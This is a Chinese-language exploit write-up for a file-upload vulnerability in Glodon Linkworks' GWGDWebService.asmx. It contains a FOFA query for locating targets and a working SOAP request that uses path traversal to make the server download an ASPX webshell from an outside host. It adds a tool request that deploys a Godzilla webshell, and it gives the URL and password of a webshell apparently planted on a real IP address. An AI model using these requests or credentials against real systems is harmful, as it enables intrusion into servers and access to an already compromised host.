# 广联达 linkworks GBLKArchiveManagementJsGWGDWebService.asmx 文件上传漏洞

    ## fofa

```
body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
```

## poc

WebShell URL: http://1.116.53.66:8866/Common/D10febfbD4AD9e4f.aspx
Password: pass 加密器：JAVA_AES_BASE64
WebShell tool: Godzilla v4.1

```
POST /GB/LK/ArchiveManagement/Js/GWGDWebService.asmx HTTP/1.1
Host: 1.116.53.66:8866
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: text/xml; charset=utf-8
Accept-Encoding: gzip
Content-Length: 954

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetGWGDData>
         <!--Optional:-->
         <tem:data>
            <root>
               <GWINFO>
                  <鍏枃鏍囬>1</鍏枃鏍囬>
                  <鎷熺浜?鎷熺浜?/鎷熺浜?
                  <涓婚€佸崟浣?涓婚€佸崟浣?/涓婚€佸崟浣?
                  <涓婚璇?涓婚璇?/涓婚璇?
                  <鍗板彂浠芥暟>1</鍗板彂浠芥暟>
                  <绛惧彂鏃ユ湡>2022-12-07</绛惧彂鏃ユ湡>
               </GWINFO>
               <aa>
                  <FileName>./../../../../../../../applications/gtp-default/Web/Common/55B2efF7fBb2d555.aspx</FileName>
                  <DownLoadURL>https://gobygo.net/ps/aspx/upload.aspx</DownLoadURL>
               </aa>
            </root>
         </tem:data>
      </tem:GetGWGDData>
   </soapenv:Body>
</soapenv:Envelope>

```

## goexp

```
POST /api/v1/debugExp HTTP/1.1
Content-Type: application/json;charset=UTF-8
Authorization: Basic dXNlcjpwYXNz
host: 82.156.29.211:8365
Connection: close
Content-Length: 159

{"hostinfo":"1.116.53.66:8866","vulfile":"CVD-2023-2868.go","expparams":{"attackType":"webshell","webshell":"godzilla","filename":"test.txt","content":"test"}}
```
